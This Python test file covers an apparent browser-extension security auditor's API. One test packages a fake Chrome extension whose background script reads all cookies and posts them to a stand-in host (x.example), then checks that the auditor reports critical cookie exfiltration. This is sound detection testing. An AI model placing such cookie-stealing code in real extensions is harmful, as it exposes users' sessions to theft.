import json

from fastapi.testclient import TestClient

from extsentinel import api
from extsentinel.service import Auditor

from .conftest import make_crx3, make_zip


def client(cfg):
    api.auditor = Auditor(cfg)
    return TestClient(api.app)


def test_upload_crx_returns_report(cfg):
    manifest = {"manifest_version": 3, "name": "Up", "version": "1.2", "background": {"service_worker": "bg.js"},
                "permissions": ["cookies"]}  # fmt: skip
    crx = make_crx3(make_zip({
        "manifest.json": json.dumps(manifest),
        "bg.js": "chrome.cookies.getAll({}, c => fetch('https://x.example/', {method:'POST', body: JSON.stringify(c)}));",
    }))  # fmt: skip
    r = client(cfg).post("/api/analyze/upload", files={"file": ("t.crx", crx)})
    assert r.status_code == 200, r.text
    body = r.json()
    assert body["name"] == "Up" and body["version"] == "1.2"
    assert any(f["rule_id"] == "EXFIL_COOKIES" and f["severity"] == "critical" for f in body["findings"])
    assert (cfg.data_dir / "reports").exists()


def test_bad_upload_is_422(cfg):
    r = client(cfg).post("/api/analyze/upload", files={"file": ("t.crx", b"garbage")})
    assert r.status_code == 422


def test_invalid_id_reported_per_item(cfg):
    r = client(cfg).post("/api/analyze", json={"extension_ids": ["not-an-id"]})
    assert r.status_code == 200
    assert "not-an-id" in r.json()["errors"]


def test_health(cfg):
    assert client(cfg).get("/api/health").json()["status"] == "ok"
